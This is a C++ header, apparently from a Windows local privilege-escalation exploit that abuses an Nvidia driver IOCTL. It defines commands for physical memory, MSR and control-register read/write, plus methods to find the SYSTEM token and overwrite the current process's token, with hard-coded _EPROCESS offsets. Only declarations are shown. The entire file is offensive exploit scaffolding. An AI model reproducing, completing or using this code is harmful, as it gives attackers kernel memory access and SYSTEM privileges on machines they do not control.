#include <map>

#include "digestpp/digestpp.hpp"
#include "../Ring0/TermColor.hpp"
#include "../Ring0/logger.h"
#include "../Ring0/Hexdump.hpp"

// Nvidia Definition
#define IOCTL_NVIDIA_DISPATCH	0x9C40A484

using std::string;
using std::vector;
using std::map;

struct DrvInfo {
	string FileName;
	LPVOID BaseAddr;
};

namespace Nvidia {

	enum SupportedCmds {
		ReadCrx = 0x0,
		WriteCrx = 0x1,
		ReadMsr = 0x4, 
		WriteMsr = 0x5,
		ReadPhysicalMem = 0x14,
		WritePhysicalMem = 0x15,
		MapKernel2User = 0x1A,
		GetPhysicalAddr = 0x26
	};

// This needs to be cast to vector and hashed
// Total size should be 0x38
#pragma(push, 1)
struct CmdBuff {
	unsigned long CMD;
	unsigned long Size;
	unsigned long long SourceAddress = { 0x0 };		// Used for MmMapIo
	unsigned long long TargetVA = { 0x0 };			// Used for MmGetPhysicalAddr
	unsigned long long Unknown2 = { 0x0 };
	unsigned long long Unknown3 = { 0x0 };
	unsigned long long Unknown4 = { 0x0 };
	unsigned long long Unknown5 = { 0x0 };
};
#pragma(pop)


class NVR0 {
public:
	NVR0();
	~NVR0();
	void ElevateM1();
	ULONG_PTR GetPhysicalAddress(ULONG_PTR addr);
	void ReadPhysicalMemory(ULONG_PTR target_va, LPVOID results, DWORD size);
	void WritePhysicalMemory(ULONG_PTR target_va, LPVOID results, DWORD size);
	ULONG_PTR ReadMSR(ULONG_PTR target_msr);
	void WriteMSR(ULONG_PTR target_msr, ULONG_PTR new_value);
	void TestIOCTL();
private:
	map<string, LPVOID> GetDriverBases();
	DrvInfo FindKernelBase();
	ULONG_PTR GetPsInitialSystemProcess(DrvInfo krnl);
	DWORD GetUniqueProcessID(ULONG_PTR eprocess);
	ULONG_PTR GetEprocessByPid(DWORD pid);
	void GetSystemEproc(ULONG_PTR ptr_ep_system);		// Requires Kernel Read Primitive
	void GetSystemEprocM2();							          // Use Nt* function to retreive addr without needing read prim
	void FindSystemToken();
	void FindOurToken();
	void UpdateOurToken();
	void PadBuff(vector<BYTE> &buffer, DWORD size);
	vector<BYTE> BuildBuffer(CmdBuff data);
	vector<BYTE> HashBuffer(vector<BYTE> data);
	HANDLE m_DriverHandle;
	string m_LastError;
	HANDLE m_hBuff;
	ULONG_PTR m_SystemEPROC;
	ULONG_PTR m_SystemToken;
	ULONG_PTR m_CurrentToken;
	ULONG_PTR m_TokenRefCount;
	ULONG_PTR m_CurrentEPROC;
	DWORD m_PidOffset = 0x440;		// _EPROCESS UniqueProcessId
	DWORD m_APLOffset = 0x448;		// _EPROCESS ActiveProcessLinks
	DWORD m_TokenOffset = 0x4b8;	// _EPROCESS Token
	ULONG64	m_OldPreviousMode;
};

}
